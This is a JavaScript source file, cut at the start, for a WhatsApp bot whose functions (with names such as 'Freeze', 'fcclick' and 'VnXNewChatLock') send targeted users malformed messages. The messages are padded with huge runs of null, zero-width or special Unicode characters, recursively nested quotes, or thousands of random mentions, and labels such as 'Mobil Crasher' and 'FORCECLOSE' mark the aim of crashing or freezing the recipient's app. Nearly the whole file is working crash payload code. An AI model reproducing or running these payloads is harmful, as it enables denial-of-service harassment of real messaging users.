      jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAiaQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=', 'base64'), 
      scansSidecar: '3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==', 
      scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164], 
      midQualityFileSha256: 'Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=', 
      contextInfo: { 
        pairedMediaType: 'NOT_PAIRED_MEDIA', 
        isQuestion: true, 
        isGroupStatus: true, 
        mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')] 
      } 
    }, 
    autoDownloadSettings: { downloadImages: true, downloadAudio: false, downloadVideo: false, downloadDocuments: false } 
  }, { userJid: target });

  const interactiveMessage = {
    interactiveMessage: {
      body: { text: "Kayzen" + "\u200D".repeat(80000) },
      footer: { text: "Kayzen Is Here" },
      header: { hasMediaAttachment: false },
      nativeFlowMessage: {
        buttons: [{
          name: "booking_status",
          buttonParamsJson: JSON.stringify({
            reference_id: "ြ".repeat(12000),
            status: "kayzen" + "\u200C".repeat(30000),
            title: "Kayzen Is Here",
            description: "Mobil Crasher",
            action_link: "t.me/bagasreall" + "ꦾ".repeat(30000),
            action_link_title: "\u200D".repeat(20000)
          })
        }],
        messageParamsJson: "{".repeat(12000),
        messageVersion: 1
      }
    }
  };

  try {
    await sock.relayMessage('status@broadcast', vnxfcnih.message, { 
      additionalNodes: [{ tag: 'meta', attrs: {}, content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }] }] }], 
      statusJidList: [target], 
      messageId: vnxfcnih.key.id 
    });

    if (mention) {
      await sock.relayMessage(target, { statusMentionMessage: { message: { protocolMessage: { key: vnxfcnih.key, type: 25 } } } }, {});
    }

    await sock.relayMessage(target, interactiveMessage, { participant: { jid: target } });
  } catch (error) {
    console.log("Transmission Error:", error);
  }
}

async function jadavo(zuki, target) {
  await zuki.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "../RTR-XUOI"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_and_pay",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: {
                value: 999999999999,
                offset: 100
              },
              reference_id: "\u0000".repeat(5000),
              order: {
                status: "pending",
                items: [
                  {
                    name: "𑇂𑆵𑆴𑆿".repeat(9999),
                    amount: { value: 100000, offset: 100 },
                    quantity: 99999
                  }
                ]
              }
            })
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await zuki.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(75000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"rtr","key":"${'\u0000'.repeat(9000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });

  await zuki.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "RTR-CRB",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"rtr","city":"jkt","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 8640000
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await zuki.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(75000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function fcclick(sock, target) {
  await sock.relayMessage(target, {
    eventMessage: {
      eventType: "MESSAGE_SEND",
      eventPayload: {
        errorMessage: "X".repeat(100000)
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 10000 }, () => `1${Math.random()*9e6}@s.whatsapp.net`)
      }
    }
  }, { participant: { jid: target } });
}

async function infinityfrezee(sock, target) {
  let zephyrine = [];

  const opts = {
    hasMediaAttachment: false
  };

  for (let i = 0; i < 15; i++) {
    zephyrine.push({
      header: opts,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const viewOnceMessages = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" },
            footer: { text: "\u{2014} \u{1D419}\u{1D6B5}\u{1D413}\u{1D407}\u{1D418}\u{1D411}\u{1D408}\u{1D40D}\u{1D404}' \u{1D412}\u{1D408}\u{1D40D}\u{1D408}\u{1D412}\u{1D413}\u{1D400}\u{1D411}' \u{F8FF}" },
            carouselMessage: {
              cards: zephyrine,
              messageVersion: 1
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, viewOnceMessages.message, {
    messageId: viewOnceMessages.key.id,
    participant: { jid: target }
  });
}

async function VnXNewFOrceImageNoClick(sock, target, mention = true) {
  const vnxfcnih = generateWAMessageFromContent(
    target,
    {
    imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c&mms3=true",
       directPath: "/o1/v/t24/f2/m237/AQMXWKQwsrMYQwbJcty5nkMgF5D-fZ8xu-dRDhdIgrvqIiJdZ1ZgXuptdi7xEOTEBJDsBYw0b1CSwfoqWGOxXqaSURsrqFmQUGmFTxZBQw?ccb=9-4&oh=01_Q5Aa4gEIpMScGwc3W4TATq5YX3QpFwR_nPrYTlkqEAicxA13-Q&oe=6A2625EF&_nc_sid=e6ed6c",
        mimetype: 'image/jpeg',
        caption: 'VnX',
        mediaKey: "gMU/MAFMpfewBPxf03l77UJ4BFniwIskJin1EAMj8e8=",
        fileEncSha256: "qMxO75MnLoMaS/b/UuTRAtBNXh2H0HSVPVkJlkmSpgk=",
        fileSha256: "RbwxheXko2h6rCjgkzKmD+l/wFliuC6SxtY3tbwSNzg=",
        fileLength: '19897899',
        mediaKeyTimestamp: "1778296099",
        jpegThumbnail: Buffer.from(
          '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=',
          'base64',
        ),
        contextInfo: {
          pairedMediaType: 'NOT_PAIRED_MEDIA',
          isQuestion: true,
          isGroupStatus: true,
        },
        scansSidecar:
          '3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==',
        scanLengths: [
          2899999999999999077, 1799999999999998555, 7699999999999999148,
          1069999999999999164,
        ],
        midQualityFileSha256: 'Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=',
      },
    },
    { userJid: target },
  );
  await sock.relayMessage('status@broadcast', vnxfcnih.message, {
    additionalNodes: [
      {
        tag: 'meta',
        attrs: {},
        content: [
          {
            tag: 'mentioned_users',
            attrs: {},
            content: [
              { tag: 'to', attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
    statusJidList: [target],
    messageId: vnxfcnih.key.id,
  });
  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: { protocolMessage: { key: vnxfcnih.key, type: 25 } },      
        },
      }, {},
    );
  }
  await sock.sendMessage(target, {
     text: "GXION SEPONG FORCECLOSE"
   }, { participant: { jid: target } });
}
    
async function FreezeGorup(sock, target) {
  await sock.relayMessage(target, {
    interactiveResponseMessage: {
      body: {
        text: "GroupLuAmposDekk",
        format: 1
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"wa_flow_response_params\":{\"yandexfc\":${"𑇂𑆵𑆴𑆿".repeat(80000)}}}`,
        version: 3,
      }
    }
  });
}

async function VnXNewChatLock(sock, target) {
    const vnx = {
      interactiveMessage: {
        body: {
          text: "BLANK CLICK BANG -> GXION <-",
          footer: "VnX Dep Raffi"
        },
        nativeFlowMessage: {
          buttons: [
          {
           name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "Chat lock By Gxion"
            }),
           },
           {
           name: "cta_call",
            buttonParamsJson: JSON.stringify({
              display_text: "ꦽ".repeat(250000),
              phone_number: "00000000000000"
              })
            }
          ],
          version: 3
         }
      }
   };
      
await sock.relayMessage(target, vnx, {
    participant: { jid: target },
  });
}

async function Freeze(sock, target) {
    const hawojk = "𑇂𑆵𑆴𑆿".repeat(100000);
    const sunopw = "\u0000".repeat(900000);
    
    let Majalengka = null;
    for(let i = 0; i < 800; i++) {
        Majalengka = {
            interactiveResponseMessage: {
                body: { text: hawojk.slice(0, 50000), format: 1 },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{"wa_flow_response_params":{"title":"${hawojk}"}}`,
                    version: 3
                },
                contextInfo: { quotedMessage: Majalengka }
            }
        };
    }
    
    await sock.relayMessage(target, {
        interactiveResponseMessage: {
            body: { text: "#jukijuki", format: 1 },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `{"wa_flow_response_params":{"title":"${hawojk}"}}`,
                version: 3
            },
            contextInfo: {
                quotedMessage: Majalengka,
                mentionedJid: Array.from({ length: 50000 }, () => 
                    `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
                )
            }
        }
    }, { participant: { jid: target } });
    
    await sock.sendMessage(target, {
        text: "\u200b".repeat(500000),
        contextInfo: { quotedMessage: Majalengka }
    }).catch(()=>{});
}

async function VnXNewOneButtonsBlnk(sock, target) {
  const VnXOneButton = [
    {
      buttonId: "VnX",
      buttonText: {
        displayText: "ꦽ".repeat(80000)
      },
      type: 1
    }
  ];

 const vnxbtns = {
   buttonsMessage: {
      contentText: "ꦾ".repeat(250000),
      footerText: "\u0000".repeat(15000),
      buttons: VnXOneButton,
      headerType: 1
    }
  };
   
    const VnXblnksltter = {
       newsletterAdminInviteMessage: {
          newsletterJid: "120363321780343299@newsletter",
          newsletterName: "Coba Kamu Pencet Chat Ini 🍁" + "ꦽꦾ".repeat(250000),
          caption: "VnX Bng" + "ꦽꦾ".repeat(250000),
          inviteExpiration: "9282682616283736",    
       }
    };
  
   await sock.relayMessage(target, VnXblnksltter, { 
    participant: { jid: target } 
  });
    
    await sock.relayMessage(target, vnxbtns, { 
    participant: { jid: target } 
  });
}

// ━━━〔 MENJALANKAN BOT 〕━━━ //
(async () => {
  try {
    await startSesi();
    await bot.launch();

    console.log(chalk.green("Hello world"));

  } catch {
    process.exit(1);
  }
})();